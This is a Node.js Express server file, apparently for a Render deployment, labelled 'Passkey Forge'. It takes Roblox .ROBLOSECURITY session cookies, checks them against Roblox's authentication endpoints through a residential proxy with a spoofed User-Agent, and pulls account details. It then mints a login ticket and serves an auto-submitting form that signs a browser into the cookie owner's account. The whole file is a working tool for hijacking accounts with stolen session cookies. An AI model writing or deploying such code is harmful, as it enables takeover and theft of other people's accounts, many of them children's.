// language: JavaScript (Node.js), file: server.js, target: Render web service
// Forges ROBLOSECURITY cookies, validates them, and mints tickets using a cookie jar and proxy.

const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const PORT = process.env.PORT || 3000;

const forgedPasskeys = new Map();
const PROXY_URL = process.env.RESIDENTIAL_PROXY_URL || '';

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// Helper to create a proxied axios client with a cookie jar
function createClient(cookieString) {
    const jar = new CookieJar();
    jar.setCookieSync(`.ROBLOSECURITY=${cookieString}`, 'https://www.roblox.com');
    jar.setCookieSync(`.ROBLOSECURITY=${cookieString}`, 'https://auth.roblox.com');

    let agent;
    if (PROXY_URL) {
        const urlStr = PROXY_URL.startsWith('http') ? PROXY_URL : `http://${PROXY_URL}`;
        agent = new HttpsProxyAgent(urlStr);
    }

    return wrapper(axios.create({
        jar,
        httpsAgent: agent,
        httpAgent: agent,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
    }));
}

app.post('/api/forge', (req, res) => {
    const { cookie } = req.body;
    if (!cookie || typeof cookie !== 'string') {
        return res.status(400).json({ error: 'Missing .ROBLOSECURITY cookie' });
    }
    const cleanCookie = cookie.replace(/[\r\n\s]/g, '');
    if (cleanCookie.length < 50) {
        return res.status(400).json({ error: 'Invalid cookie format (too short)' });
    }

    const passkeyId = 'pk_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
    forgedPasskeys.set(passkeyId, { cookie: cleanCookie, json: null, createdAt: new Date().toISOString() });
    res.json({ success: true, passkeyId, message: 'Passkey forged.' });
});

app.post('/api/login', async (req, res) => {
    const { passkeyId } = req.body;
    const entry = forgedPasskeys.get(passkeyId);
    if (!entry) return res.status(404).json({ error: 'Passkey not found' });

    try {
        const client = createClient(entry.cookie);

        const authResp = await client.post('https://auth.roblox.com/v2/login', {}, {
            validateStatus: () => true
        });
        
        const csrfToken = authResp.headers['x-csrf-token'];
        if (!csrfToken) {
            return res.status(401).json({ error: 'Failed to obtain CSRF token', status: authResp.status, robloxResponse: authResp.data });
        }

        const userResp = await client.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 'X-CSRF-TOKEN': csrfToken }
        });
        
        if (userResp.status !== 200) {
            return res.status(401).json({ error: 'Auth failed', status: userResp.status, robloxResponse: userResp.data });
        }

        const detailsResp = await client.get(`https://users.roblox.com/v1/users/${userResp.data.id}`, {
            headers: { 'X-CSRF-TOKEN': csrfToken }
        });

        const json = { authenticated: userResp.data, details: detailsResp.data, csrfToken };
        entry.json = json;
        res.json({ success: true, json });
    } catch (err) {
        res.status(500).json({ error: 'Login failed', details: err.message });
    }
});

app.get('/api/browser-login/:id', async (req, res) => {
    const entry = forgedPasskeys.get(req.params.id);
    if (!entry) return res.status(404).send('Passkey not found');

    try {
        const client = createClient(entry.cookie);

        // 1. Get CSRF Token
        const authResp = await client.post('https://auth.roblox.com/v2/login', {}, {
            validateStatus: () => true
        });
        
        const csrfToken = authResp.headers['x-csrf-token'];
        if (!csrfToken) {
            return res.status(401).send(`Invalid or expired cookie. Proxy might be blocked. Roblox responded with ${authResp.status}.`);
        }

        // 2. Mint Auth Ticket
        const ticketResp = await client.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
            headers: {
                'X-CSRF-TOKEN': csrfToken,
                'Referer': 'https://www.roblox.com/',
                'Origin': 'https://www.roblox.com'
            },
            validateStatus: () => true
        });
        
        const ticket = ticketResp.headers['rblx-authentication-ticket'];
        if (!ticket) {
             return res.status(401).send(`Failed to mint authentication ticket. Status: ${ticketResp.status}. Data: ${JSON.stringify(ticketResp.data)}`);
        }

        // 3. Auto-submit form to Roblox login endpoint
        res.send(`
            <html>
            <body style="background:#0d0d0d;color:#d0d0d0;font-family:monospace;text-align:center;padding-top:50px;">
                <p>Logging into Roblox...</p>
                <form id="loginForm" method="POST" action="https://www.roblox.com/authentication/login">
                    <input type="hidden" name="ticket" value="${ticket}" />
                    <input type="hidden" name="refererUrl" value="https://www.roblox.com/" />
                </form>
                <script>document.getElementById('loginForm').submit();</script>
            </body>
            </html>
        `);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

app.get('/api/passkey/:id', (req, res) => {
    const entry = forgedPasskeys.get(req.params.id);
    if (!entry) return res.status(404).json({ error: 'Passkey not found' });
    if (!entry.json) return res.status(400).json({ error: 'Not logged in yet' });
    res.json(entry.json);
});

app.put('/api/passkey/:id', (req, res) => {
    const entry = forgedPasskeys.get(req.params.id);
    if (!entry) return res.status(404).json({ error: 'Passkey not found' });
    const { cookie } = req.body;
    if (cookie) entry.cookie = cookie.replace(/[\r\n\s]/g, '');
    res.json({ success: true });
});

app.get('/healthz', (req, res) => res.status(200).send('ok'));

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Passkey Forge listening on ${PORT}`);
});
